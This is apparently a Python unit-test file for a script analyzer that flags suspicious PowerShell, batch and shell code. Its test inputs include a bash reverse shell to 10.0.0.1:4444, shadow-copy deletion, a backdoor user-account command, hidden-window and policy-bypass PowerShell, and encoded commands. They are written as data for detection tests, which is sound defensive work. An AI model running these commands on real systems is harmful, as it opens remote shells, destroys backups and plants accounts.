"""Unit tests for script_analyzer.py (run from the repo root: python -m unittest discover tests)."""
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import script_analyzer  # noqa: E402


def scan_text(text, suffix=".ps1"):
    """Write text to a temp file, analyze it, and return the set of rule names."""
    with tempfile.NamedTemporaryFile("w", suffix=suffix, delete=False) as f:
        f.write(text)
        path = f.name
    try:
        return {item["rule"] for item in script_analyzer.analyze(path)}
    finally:
        os.remove(path)


class ScriptAnalyzerTests(unittest.TestCase):
    def test_clean_script_has_no_findings(self):
        self.assertEqual(scan_text("Write-Host 'hello world'"), set())

    def test_download_command_flagged(self):
        self.assertIn("Download command",
                      scan_text("Invoke-WebRequest http://example.com/a.txt"))

    def test_hidden_window_and_policy_bypass_flagged(self):
        rules = scan_text("powershell -WindowStyle Hidden -ExecutionPolicy Bypass")
        self.assertIn("Hidden window", rules)
        self.assertIn("Policy bypass", rules)

    def test_encoded_command_flagged(self):
        self.assertIn("Encoded command", scan_text("powershell -enc AAAA"))

    def test_long_base64_blob_flagged(self):
        self.assertIn("Long encoded blob", scan_text("A" * 250))

    def test_matching_is_case_insensitive(self):
        self.assertIn("Download command", scan_text("INVOKE-WEBREQUEST http://x"))

    def test_empty_script_has_no_findings(self):
        self.assertEqual(scan_text(""), set())

    def test_missing_file_returns_scan_error_with_zero_points(self):
        findings = script_analyzer.analyze("does_not_exist.ps1")
        self.assertEqual(findings[0]["rule"], "Scan error")
        self.assertEqual(findings[0]["points"], 0)

    def test_multiple_rules_all_reported(self):
        rules = scan_text("Invoke-WebRequest http://x\npowershell -enc AAAA")
        self.assertTrue({"Download command", "Encoded command"} <= rules)

    def test_keyword_only_in_comment_not_flagged(self):
        self.assertEqual(scan_text("# Invoke-WebRequest is how you download\nWrite-Host hi"), set())

    def test_keyword_in_code_still_flagged_with_comment_present(self):
        rules = scan_text("# note\nInvoke-WebRequest http://x")
        self.assertIn("Download command", rules)

    def test_python_comment_with_eval_not_flagged(self):
        self.assertEqual(scan_text("# never use eval(x)\nprint(1)", ".py"), set())

    def test_batch_rem_comment_not_flagged(self):
        self.assertEqual(scan_text("REM certutil -urlcache x\necho hi", ".bat"), set())

    def test_shadow_copy_deletion_flagged(self):
        self.assertIn("Shadow copy deletion", scan_text("vssadmin delete shadows /all /quiet"))

    def test_listing_shadow_copies_not_flagged(self):
        self.assertNotIn("Shadow copy deletion", scan_text("vssadmin list shadows"))

    def test_create_user_account_flagged(self):
        self.assertIn("Creates user account", scan_text("net user hacker pass123 /add", ".bat"))

    def test_reverse_shell_flagged(self):
        self.assertIn("Reverse shell", scan_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", ".sh"))

    def test_hide_files_flagged(self):
        self.assertIn("Hides files", scan_text("attrib +h secret.txt", ".bat"))

    def test_eicar_signature_flagged(self):
        self.assertIn("EICAR test signature", scan_text("EICAR-STANDARD-ANTIVIRUS-TEST-FILE"))

    def test_is_script_by_extension(self):
        self.assertTrue(script_analyzer.is_script("run.ps1"))
        self.assertFalse(script_analyzer.is_script("photo.jpg"))

    def test_findings_use_shared_format(self):
        with tempfile.NamedTemporaryFile("w", suffix=".ps1", delete=False) as f:
            f.write("powershell -enc AAAA")
            path = f.name
        try:
            for item in script_analyzer.analyze(path):
                self.assertEqual(set(item), {"rule", "points", "reason"})
                self.assertIsInstance(item["points"], int)
        finally:
            os.remove(path)


if __name__ == "__main__":
    unittest.main()
